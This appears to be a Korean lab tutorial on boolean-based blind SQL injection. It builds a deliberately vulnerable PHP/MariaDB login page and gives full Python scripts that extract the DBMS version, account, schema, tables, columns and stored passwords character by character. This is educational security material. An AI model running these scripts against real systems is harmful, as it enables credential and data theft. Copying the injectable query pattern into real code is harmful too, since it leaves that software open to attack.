# Boolean based SQL Injection

[Error based SQL Injection](https://github.com/2jinu/CyberSecurity/tree/main/Web/SQL%20Injection%20-%20Error%20based)처럼 에러가 출력되지 않는 상황에서 참 혹은 거짓의 결과를 판별할 수 있을 경우 정보를 획득하기 위해 사용한다.

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [Boolean based](#Boolean-based)**

 - [DBMS 버전 확인](#DBMS-버전-확인)

 - [DBMS 계정 확인](#DBMS-계정-확인)

 - [데이터베이스 이름 확인](#데이터베이스-이름-확인)

 - [테이블 이름 확인](#테이블-이름-확인)

 - [컬럼 이름 확인](#컬럼-이름-확인)

 - [데이터 확인](#데이터-확인)


# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4.3                     |
| mariadb       | 10.3.34-0ubuntu0.20.04.1  |

apache, php와 데이터베이스를 사용하기 위해 관련 패키지를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php mariadb-server php-mysql
```

root비밀번호를 설정하고 데이터베이스, 테이블을 생성한 뒤 데이터를 넣자.

```sh
root@ubuntu:~# mysql_secure_installation
Enter current password for root (enter for none):
Set root password? [Y/n] Y
New password:
Re-enter new password:
Remove anonymous users? [Y/n] Y
Disallow root login remotely? [Y/n] n
Remove test database and access to it? [Y/n] Y
Reload privilege tables now? [Y/n] Y
root@ubuntu:~# mysql -u root -p'root'
MariaDB [(none)]> create database test;
MariaDB [(none)]> use test;
MariaDB [test]> create table user (id varchar(30), pw varchar(30));
MariaDB [test]> insert into user(id,pw) values('admin','helloworld');
MariaDB [test]> insert into user(id,pw) values('test','test');
```

생성한 데이터베이스로 접근할 수 있는 권한을 부여하자.

```sh
MariaDB [(none)]> grant all privileges on test.* to 'root'@localhost identified by 'root';
MariaDB [(none)]> flush privileges;
```

이후 php.ini를 수정하여 데이터베이스 관련 함수를 사용할 수 있도록 하자.

```ini
extension=mysqli.so
```

SQLi(SQL Injection)에 취약한 페이지를 생성하자.

```php
<?php
	if (isset($_GET['userid']) && isset($_GET['password'])) {
		$conn = mysqli_connect("localhost", "root", "root", "test");
		if (!$conn) die("mysql connect error : ".mysqli_connect_error($conn));
		$sql = "SELECT id, pw FROM user WHERE id='".$_GET['userid']."' and pw='".$_GET['password']."'";
		$result = mysqli_query($conn, $sql);
		$row = mysqli_fetch_array($result);
		if ($row) echo "Welcome ".$row[id];
		else echo "Login Failed";
		mysqli_close($conn);
	} else {
?>
<html>
	<body>
		<form action="/index.php" method="get">
			<label>ID : </label><input type="text" name="userid" required>
			<label>PW : </label><input type="password" name="password" required>
			<input type="submit" value="login">
		</form>
	</body>
</html>
<?php
	}
?>
```

# **Boolean based**

AND나 OR같이 [논리적 에러](#https://github.com/2jinu/CyberSecurity/tree/main/Web/SQL%20Injection%20-%20Error%20based#%EB%85%BC%EB%A6%AC%EC%A0%81-%EC%97%90%EB%9F%AC)를 이용하여 정보를 획득할 수 있다.

쿼리를 통한 참의 결과와 거짓의 결과를 구분할 수 있어야 한다. 참과 거짓의 결과 중 하나만 있어도 되지만 이번 예제에서는 둘다 알아보자.

먼저 다음의 정보를 입력하여 참의 결과를 획득해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| test |
| PW	| test |
| URL	| http://192.168.0.58/index.php?userid=test&password=test |

결과는 다음과 같다.

	Welcome test

거짓의 결과를 획득해보자.

| data	| value	|
| :---	| :--- 	|
| ID	| a |
| PW	| a |
| URL	| http://192.168.0.58/index.php?userid=a&password=a |

결과는 다음과 같다.

	Login Failed

수기입력으로 Blind SQL Injection을 수행하기에는 어려움이 있다.

따라서 python을 이용하여 스크립트로 수행하고 웹 통신을 위해여 requests패키지를 사용해보자.

## **DBMS 버전 확인**

참과 거짓의 결과 정보를 이용하여 DBMS의 버전을 획득해보자.

다음과 같이 DBMS 버전의 문자열 길이를 확인할 것이고, URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.

```py
QUERY       = requests.utils.quote(f'test\' AND LENGTH(VERSION())={i}#')
```

쿼리의 결과가 참일 경우 DBMS 버전의 문자열 길이를 알 수 있다.

```py
REQUEST     = requests.get(url=URL)
if REQUEST.text == 'Welcome test':
	RESULT_LENGTH = i
	break
```

DBMS의 버전을 확인하기 위해 SUBSTR로 한글자씩 맞춰나갈 것이며, 대소문자를 구분하기 위해 ASCII함수를 사용하자.

```py
QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR(VERSION(),{i+1},1))={ord(s)}#')
```

마찬가지로 쿼리의 결과가 참일 경우 DBMS 버전의 문자열 일부를 알 수 있다.

다음의 Full Code로 DBMS의 버전을 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT          = ''
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND LENGTH(VERSION())={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'VERSION LENGTH : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    for s in string.printable.strip():
        QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR(VERSION(),{i+1},1))={ord(s)}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': RESULT += s
print(f'VERSION : {RESULT}')
```

결과는 다음과 같다.

	VERSION : 10.3.34-MariaDB-0ubuntu0.20.04.1

## **DBMS 계정 확인**

참과 거짓의 결과 정보를 이용하여 DBMS의 계정을 획득해보자.

다음과 같이 DBMS 계정의 문자열 길이를 확인할 것이고, URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.

```py
QUERY       = requests.utils.quote(f'test\' AND LENGTH(USER())={i}#')
```

쿼리의 결과가 참일 경우 DBMS 계정의 문자열 길이를 알 수 있다.

```py
REQUEST     = requests.get(url=URL)
if REQUEST.text == 'Welcome test':
	RESULT_LENGTH = i
	break
```

DBMS의 계정을 확인하기 위해 SUBSTR로 한글자씩 맞춰나갈 것이며, 대소문자를 구분하기 위해 ASCII함수를 사용하자.

```py
QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR(USER(),{i+1},1))={ord(s)}#')
```

마찬가지로 쿼리의 결과가 참일 경우 DBMS 계정의 문자열 일부를 알 수 있다.

다음의 Full Code로 DBMS의 계정을 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT          = ''
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND LENGTH(USER())={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'USER LENGTH : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    for s in string.printable.strip():
        QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR(USER(),{i+1},1))={ord(s)}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': RESULT += s
print(f'USER : {RESULT}')
```

결과는 다음과 같다.

	USER : root@localhost

## **데이터베이스 이름 확인**

참과 거짓의 결과 정보를 이용하여 데이터베이스의 이름을 획득해보자.

다음과 같이 데이터베이스의 문자열 길이를 확인할 것이고, URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.

```py
QUERY       = requests.utils.quote(f'test\' AND LENGTH(DATABASE())={i}#')
```

쿼리의 결과가 참일 경우 데이터베이스의 이름의 문자열 길이를 알 수 있다.

```py
REQUEST     = requests.get(url=URL)
if REQUEST.text == 'Welcome test':
	RESULT_LENGTH = i
	break
```

데이터베이스의 이름을 확인하기 위해 SUBSTR로 한글자씩 맞춰나갈 것이며, 대소문자를 구분하기 위해 ASCII함수를 사용하자.

```py
QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR(DATABASE(),{i+1},1))={ord(s)}#')
```

마찬가지로 쿼리의 결과가 참일 경우 데이터베이스의 이름의 문자열 일부를 알 수 있다.

다음의 Full Code로 데이터베이스의 이름을 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT          = ''
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND LENGTH(DATABASE())={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'DATABASE LENGTH : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    for s in string.printable.strip():
        QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR(DATABASE(),{i+1},1))={ord(s)}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': RESULT += s
print(f'DATABASE : {RESULT}')
```

결과는 다음과 같다.

	DATABASE : test

DBMS의 모든 데이터베이스 이름을 확인해보자.

먼저 COUNT를 이용하여 데이터베이스의 수를 확인하자.

SELECT의 이중쿼리의 경우 출력결과가 1개로 나와야 하며 괄호를 이용하여 감싸준다.

```py
for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA)={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'Number of databases : {RESULT_LENGTH}')
```

다음으로 LIMIT을 이용하여 하나 씩 데이터베이스 이름의 문자열 길이를 확인하자.

```py
QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT {i},1))={j}#')
```

다시 SUBSTR로 문자열을 하나씩 확인한다.

```py
QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT {i},1),{j+1},1))={ord(s)}#')
```

다음의 Full Code로 모든 데이터베이스의 이름을 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA)={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'Number of databases : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    DATABASE_NAME_LENGTH    = 0
    DATABASE_NAME           = ''
    for j in range(100):
        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT {i},1))={j}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': DATABASE_NAME_LENGTH = j
    for j in range(DATABASE_NAME_LENGTH):
        for s in string.printable.strip():
            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT {i},1),{j+1},1))={ord(s)}#')
            URL     = TARGET + f'?userid={QUERY}&password=123'
            REQUEST = requests.get(url=URL)
            if REQUEST.text == 'Welcome test': DATABASE_NAME += s
    print(f'{DATABASE_NAME}')
```

결과는 다음과 같다.

	information_schema
	mysql
	test
	performance_schema

## **테이블 이름 확인**

참과 거짓의 결과 정보를 이용하여 테이블의 이름을 획득해보자.

먼저 COUNT를 이용하여 테이블의 수를 확인하자.

SELECT의 이중쿼리의 경우 출력결과가 1개로 나와야 하며 괄호를 이용하여 감싸준다.

URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.

```py
QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\')={i}#')
```

테이블 수만큼 반복하여 다음으로 테이블 이름의 문자열 길이를 알아내자.

```py
QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1))={j}#')
```

다시 SUBSTR로 문자열을 하나씩 확인한다.

```py
QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1),{j+1},1))={ord(s)}#')
```

다음의 Full Code로 모든 테이블의 이름을 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\')={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'Number of tables : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    TABLE_NAME_LENGTH    = 0
    TABLE_NAME           = ''
    for j in range(100):
        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1))={j}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': TABLE_NAME_LENGTH = j
    for j in range(TABLE_NAME_LENGTH):
        for s in string.printable.strip():
            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1),{j+1},1))={ord(s)}#')
            URL     = TARGET + f'?userid={QUERY}&password=123'
            REQUEST = requests.get(url=URL)
            if REQUEST.text == 'Welcome test': TABLE_NAME += s
    print(f'{TABLE_NAME}')
```

결과는 다음과 같다.

	user

## **컬럼 이름 확인**

참과 거짓의 결과 정보를 이용하여 컬럼의 이름을 획득해보자.

먼저 COUNT를 이용하여 컬럼의 수를 확인하자.

SELECT의 이중쿼리의 경우 출력결과가 1개로 나와야 하며 괄호를 이용하여 감싸준다.

URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.

```py
QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\')={i}#')
```

컬럼 수만큼 반복하여 다음으로 컬럼의 문자열 길이를 알아내자.

```py
QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1))={j}#')
```

다시 SUBSTR로 문자열을 하나씩 확인한다.

```py
QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1),{j+1},1))={ord(s)}#')
```

다음의 Full Code로 모든 컬럼의 이름을 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\')={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'Number of columns : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    COLUMN_NAME_LENGTH    = 0
    COLUMN_NAME           = ''
    for j in range(100):
        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1))={j}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': COLUMN_NAME_LENGTH = j
    for j in range(COLUMN_NAME_LENGTH):
        for s in string.printable.strip():
            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1),{j+1},1))={ord(s)}#')
            URL     = TARGET + f'?userid={QUERY}&password=123'
            REQUEST = requests.get(url=URL)
            if REQUEST.text == 'Welcome test': COLUMN_NAME += s
    print(f'{COLUMN_NAME}')
```

결과는 다음과 같다.

	id
    pw

## **데이터 확인**

참과 거짓의 결과 정보를 이용하여 데이터를 획득해보자.

먼저 COUNT를 이용하여 데이터의 수를 확인하자.

SELECT의 이중쿼리의 경우 출력결과가 1개로 나와야 하며 괄호를 이용하여 감싸준다.

URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.

```py
QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(id) FROM test.user)={i}#')
```

데이터 수만큼 반복하여 다음으로 데이터의 문자열 길이를 알아내자.

```py
QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT id FROM test.user LIMIT {i},1))={j}#')
```

다시 SUBSTR로 문자열을 하나씩 확인한다.

```py
QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT id FROM test.user LIMIT {i},1),{j+1},1))={ord(s)}#')
```

다음의 Full Code로 모든 id 컬럼의 데이터를 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(id) FROM test.user)={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'Number of data : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    DATA_LENGTH    = 0
    DATA           = ''
    for j in range(100):
        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT id FROM test.user LIMIT {i},1))={j}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': DATA_LENGTH = j
    for j in range(DATA_LENGTH):
        for s in string.printable.strip():
            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT id FROM test.user LIMIT {i},1),{j+1},1))={ord(s)}#')
            URL     = TARGET + f'?userid={QUERY}&password=123'
            REQUEST = requests.get(url=URL)
            if REQUEST.text == 'Welcome test': DATA += s
    print(f'{DATA}')
```

결과는 다음과 같다.

	admin
    test

다음의 Full Code로 모든 pw 컬럼의 데이터를 확인해보자.

```py
import requests
import string

TARGET          = 'http://192.168.0.58/index.php'
RESULT_LENGTH   = 0

for i in range(100):
    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(id) FROM test.user)={i}#')
    URL         = TARGET + f'?userid={QUERY}&password=123'
    REQUEST     = requests.get(url=URL)
    if REQUEST.text == 'Welcome test':
        RESULT_LENGTH = i
        break
print(f'Number of data : {RESULT_LENGTH}')

for i in range(RESULT_LENGTH):
    DATA_LENGTH    = 0
    DATA           = ''
    for j in range(100):
        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT pw FROM test.user LIMIT {i},1))={j}#')
        URL         = TARGET + f'?userid={QUERY}&password=123'
        REQUEST     = requests.get(url=URL)
        if REQUEST.text == 'Welcome test': DATA_LENGTH = j
    for j in range(DATA_LENGTH):
        for s in string.printable.strip():
            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT pw FROM test.user LIMIT {i},1),{j+1},1))={ord(s)}#')
            URL     = TARGET + f'?userid={QUERY}&password=123'
            REQUEST = requests.get(url=URL)
            if REQUEST.text == 'Welcome test': DATA += s
    print(f'{DATA}')
```

결과는 다음과 같다.

	helloworld
    test